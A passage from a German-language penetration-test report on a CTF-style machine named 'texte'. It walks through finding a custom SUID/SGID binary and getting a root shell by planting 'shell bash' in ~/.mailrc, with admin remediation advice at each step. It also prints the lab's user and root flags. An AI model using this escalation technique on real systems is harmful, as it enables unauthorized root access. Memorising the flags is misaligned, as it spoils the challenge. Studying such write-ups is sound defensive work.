+     <span class="command">3483     16 -rwsr-sr-x   1 root     kamila      15560 Oct  8  2021 /opt/texte</span> <span class="password"><-- SUID Root, SGID kamila!</span>
+   134195     52 -rwsr-xr--   1 root     messagebus    50656 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   145347    524 -rwsr-xr-x   1 root     root         534076 Mar 13  2021 /usr/lib/openssh/ssh-keysign
+   129887     68 -rwsr-xr-x   1 root     root          66292 Feb  7  2020 /usr/bin/passwd
+   133535     80 -rwsr-xr-x   1 root     root          79396 Jul 28  2021 /usr/bin/su
+   133371     44 -rwsr-xr-x   1 root     root          43252 Feb  7  2020 /usr/bin/newgrp
+   133897     52 -rwsr-xr-x   1 root     root          50720 Jul 28  2021 /usr/bin/mount
+   129884     48 -rwsr-xr-x   1 root     root          47908 Feb  7  2020 /usr/bin/chsh
+   129883     56 -rwsr-xr-x   1 root     root          56836 Feb  7  2020 /usr/bin/chfn
+   133899     32 -rwsr-xr-x   1 root     root          30236 Jul 28  2021 /usr/bin/umount
+   129886     88 -rwsr-xr-x   1 root     root          86660 Feb  7  2020 /usr/bin/gpasswd
+   148246   1424 -rwsr-xr-x   1 root     root        1457924 Jul 13  2021 /usr/sbin/exim4
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Suche nach SUID-Dateien (`find / -perm -4000 ...`) identifiziert neben den üblichen Verdächtigen eine benutzerdefinierte Datei: `<span class="command">/opt/texte</span>`. Diese Datei hat sowohl das SUID-Bit (Besitzer `root`) als auch das SGID-Bit (Gruppe `kamila`) gesetzt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der vielversprechendste Vektor für die Root-Eskalation. Ein SUID-Root-Binary, das zusätzlich SGID für die Gruppe des aktuellen Benutzers (`kamila`) ist, kann oft ausgenutzt werden, insbesondere wenn es mit der Umgebung des Benutzers interagiert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie `/opt/texte` detailliert: `file /opt/texte`, `strings /opt/texte`, `ltrace /opt/texte`, `strace /opt/texte`. Versuchen Sie, es auszuführen. Suchen Sie nach Möglichkeiten, seine Ausführung zu beeinflussen (Umgebungsvariablen, Konfigurationsdateien im Home-Verzeichnis, die es möglicherweise liest).<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Notwendigkeit und Sicherheit von `/opt/texte`. Entfernen Sie SUID/SGID-Bits, wenn sie nicht absolut erforderlich sind. Stellen Sie sicher, dass SUID/SGID-Programme keine benutzerkontrollierten Konfigurationsdateien oder Umgebungsvariablen auf unsichere Weise verwenden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">kamila@texte:~$ <span class="command">file /opt/texte</span></div>
+                     <pre>/opt/texte: <span class="command">setuid, setgid ELF 32-bit LSB pie executable</span>, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[...], for GNU/Linux 3.2.0, not stripped</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der `file`-Befehl bestätigt, dass `/opt/texte` eine 32-Bit-ELF-Datei mit gesetzten SUID- und SGID-Bits ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Technische Bestätigung der Dateieigenschaften.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fahren Sie mit der dynamischen (`ltrace`, `strace`) und statischen (`strings`, Disassembler) Analyse fort.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">kamila@texte:/opt$ <span class="command">nano ~/.mailrc</span></div>
+                     <pre>[Editor geöffnet]</pre>
+                     <div class="prompt"># <span class="command">Füge Zeile 'shell bash' hinzu und speichere</span></div>
+                     <div class="prompt">kamila@texte:/opt$ <span class="command">./texte</span></div>
+                     <pre>root@texte:/opt# <span class="password"># Root-Shell erhalten!</span></pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Der entscheidende Schritt zur Eskalation:
+             1.  Die Datei `.mailrc` im Home-Verzeichnis von `kamila` wird erstellt oder bearbeitet.
+             2.  Die Zeile `shell bash` wird hinzugefügt. Diese Direktive wird von einigen Mail-bezogenen Programmen verwendet, um eine benutzerdefinierte Shell zu definieren.
+             3.  Das SUID/SGID-Binary `/opt/texte` wird ausgeführt.
+             4.  Statt der erwarteten Funktion startet `/opt/texte` eine Bash-Shell, die aufgrund der SUID-Berechtigung mit Root-Rechten läuft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Privilege Escalation zu `root` erfolgreich! Das SUID/SGID-Binary `/opt/texte` liest und verwendet unsicher die `.mailrc`-Konfigurationsdatei aus dem Home-Verzeichnis des ausführenden Benutzers (`kamila`). Durch die Definition einer benutzerdefinierten Shell (`bash`) in dieser Datei kann der Angreifer das Binary dazu bringen, eine Root-Shell zu starten.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Zugriff ist erreicht. Suchen Sie die Root-Flag (`/root/root.txt`).<br><strong>Empfehlung (Admin):</strong> Entfernen Sie die SUID/SGID-Berechtigungen von `/opt/texte` oder korrigieren Sie das Binary so, dass es keine benutzerkontrollierten Konfigurationsdateien wie `.mailrc` auf unsichere Weise verwendet (z.B. durch Ignorieren oder sicheres Parsen ohne Shell-Ausführung).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">root@texte:/opt# <span class="command"># cd /root</span></div> <span class="password"><-- Befehl nicht explizit gezeigt, aber impliziert</span>
+                     <div class="prompt">root@texte:/root# <span class="command">ls -la</span></div>
+                    <pre>
+total 24
+drwx------  3 root root 4096 Oct  8  2021 .
+drwxr-xr-x 18 root root 4096 Oct  8  2021 ..
+-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
+drwxr-xr-x  3 root root 4096 Oct  8  2021 .local
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+-rw-------  1 root root   12 Oct  8  2021 <span class="command">root.txt</span>
+</pre>
+                    <div class="prompt">root@texte:/root# <span class="command">cat root.txt</span></div>
+                    <pre><span class="password">IlovetextEs</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Als Root-Benutzer wird das `/root`-Verzeichnis untersucht und der Inhalt der Datei `root.txt` ausgegeben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag wurde erfolgreich gefunden und gelesen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Flag dokumentieren. Bericht abschließen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bezüglich der Flag.</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat user.txt</div>
+                     <div class="flag-value"><span class="password">IdontneedPHP</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat root.txt</div>
+                    <div class="flag-value"><span class="password">IlovetextEs</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 24. April 2023</p> <!-- Korrektes Datum aus Nmap/Burp extrahiert -->
+    </footer>
+</body>
+</html>
